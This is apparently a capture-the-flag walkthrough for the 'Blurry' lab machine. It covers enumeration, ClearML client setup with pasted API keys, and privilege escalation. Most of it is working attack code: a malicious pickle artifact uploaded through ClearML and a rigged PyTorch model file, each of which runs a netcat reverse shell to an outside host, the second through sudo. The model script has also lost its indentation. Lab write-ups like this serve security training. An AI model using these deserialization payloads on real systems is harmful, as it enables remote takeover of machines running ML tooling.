# Nmap
```sh
Nmap scan report for 10.10.11.19
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Sub-domain
```sh
curl -s -I http://10.10.11.19 -H "HOST: defnotvalid.blurry.htb" | grep "Content-Length"
Content-Length: 169
```
```sh
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.19 -H "Host: FUZZ.blurry.htb" -fs 169

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.19
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.blurry.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 169
________________________________________________

app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 55ms]
files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 118ms]
chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 103ms]
```

# Installing clearml
```sh
pip install clearml

clearml-init

api {
  web_server: http://app.blurry.htb
  api_server: http://api.blurry.htb
  files_server: http://files.blurry.htb
  credentials {
    "access_key" = "122AZ9L8UPYECOGRZ96C"
    "secret_key" = "3hjvY2BKFzxBZTqyf1omX69ld7GX0gy9yYqYnExOrM7UvmstV1"
  }
}
```

Just manually do it
#### Step 2: Manually Create the Configuration File

If connectivity is verified, create the configuration file manually.

1. Create a configuration file `clearml.conf` in your home directory or the current working directory.

bash

Copy code

`nano ~/clearml.conf`

2. Add the following configuration details to the `clearml.conf` file:

ini

Copy code

`api {   web_server: http://app.blurry.htb   api_server: http://api.blurry.htb   files_server: http://files.blurry.htb   credentials {     "access_key" = "TU9CTAVM44JG25HEEGGF"     "secret_key" = "aBTZdo4YUhLVtmgQh6SaYeMQ6EpvQtyMs9MRzZM3E93mlny8To"   } }`

#### Step 3: Set Environment Variables

Set the environment variables to point to the configuration file.

bash

Copy code

`export CLEARML_CONFIG_FILE=~/clearml.conf`

## New exploit.py
```python
from clearml import Task
import pickle, os  # Make sure to import os

class RunCommand:
    def __reduce__(self):
        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.25 4444 >/tmp/f',))

command = RunCommand()

task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"])
task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")

```

## Reverse shell
```sh
python3 exploit.py
```

![[Pasted image 20240613095154.png]]

## SSH
```
└─$ ssh -i id_rsa jippity@10.10.11.19
Linux blurry 5.10.0-30-amd64 #1 SMP Debian 5.10.218-1 (2024-06-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jun 13 05:10:08 2024 from 10.10.14.25
-bash-5.1$ 

```

# Root

You can run models as sudo

```python
import torch  
import torch.nn as nn  
import os  
class CustomModel(nn.Module):  
def __init__(self):  
super(CustomModel, self).__init__()  
self.linear = nn.Linear(10, 1)  
  
def forward(self, x):  
return self.linear(x)  
  
def __reduce__(self):  
# Custom reduce method  
cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.x.x 4444 >/tmp/f"  
return os.system, (cmd,)  
# Create an instance of the model  
model = CustomModel()  
# Save the model using torch.save  
torch.save(model, 'evil.pth')
```
```
after that run it with python3 --> python3 shell.py --> u will get evil.pth in the samy directory --> mv it to /models --> mv evil.pth /models/  
--------------------------------------------------------------------------------------------------------------------------------------------------------------  
after that in new terminal nc -nlvp 4444  
--------------------------------------------------------------------------------------------------------------------------------------------------------------  
sudo /usr/bin/evaluate_model /models/evil.pth --> pwned
```